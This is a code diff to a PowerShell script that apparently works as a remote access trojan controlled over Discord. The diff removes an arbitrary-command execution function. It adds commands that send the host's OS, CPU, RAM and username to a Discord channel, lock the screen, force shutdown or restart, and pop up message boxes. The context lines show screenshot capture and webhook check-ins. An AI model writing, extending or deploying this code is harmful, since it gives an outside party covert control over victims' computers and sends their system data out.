@@ -31,16 +31,6 @@ function Get-Screenshot {
     return $filePath
 }
 
-function Run-Command {
-    param([string]$command)
-    try {
-        $output = Invoke-Expression -Command $command 2>&1
-        return if ($output) { $output -join "`n" } else { "Invalid Command." }
-    } catch {
-        return "Error: $_"
-    }
-}
-
 Register-EngineEvent PowerShell.Exiting -Action {
     if ($whURL) { Invoke-RestMethod -Uri $whURL -Method Post -Body @{ content = "$hwid disconnected." } }
 }
@@ -84,6 +74,33 @@ while ($true) {
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
                 }
+            } elseif ($content -eq "systeminfo" -or $content -eq "sysinfo") {
+                $info = @{
+                    "Computer Name" = $hwid
+                    "OS" = (Get-CimInstance Win32_OperatingSystem).Caption
+                    "Uptime" = ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime | New-TimeSpan).ToString("g")
+                    "CPU" = (Get-CimInstance Win32_Processor).Name
+                    "RAM" = "{0} MB" -f [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB, 0)
+                    "Username" = $env:USERNAME
+                } | Out-String
+                Send-DiscordMessage -channelID $channel.id -content "``````$info``````"
+            } elseif ($content -eq "lock") {
+                rundll32.exe user32.dll,LockWorkStation
+                Send-DiscordMessage -channelID $channel.id -content "Screen locked."
+            } elseif ($content -eq "shutdown" -or $content -eq "poweroff") {
+                Send-DiscordMessage -channelID $channel.id -content "Shutting down..."
+                Stop-Computer -Force
+            } elseif ($content -eq "restart" -or $content -eq "reboot") {
+                Send-DiscordMessage -channelID $channel.id -content "Restarting..."
+                Restart-Computer -Force
+            } elseif ($content -match "^msgbox\s+\"(.*)\"\s+\"(.*)\"$") {
+                # not sure if it works yet
+                $title = $matches[1].Trim()
+                $message = $matches[2].Trim()
+                Add-Type -AssemblyName "System.Windows.Forms"
+                $result = [System.Windows.Forms.MessageBox]::Show($message, $title)
+                $response = $result.ToString()
+                Send-DiscordMessage -channelID $channel.id -content "Message displayed: '$message' with title '$title'. User response: $response"
             }
         }
     }
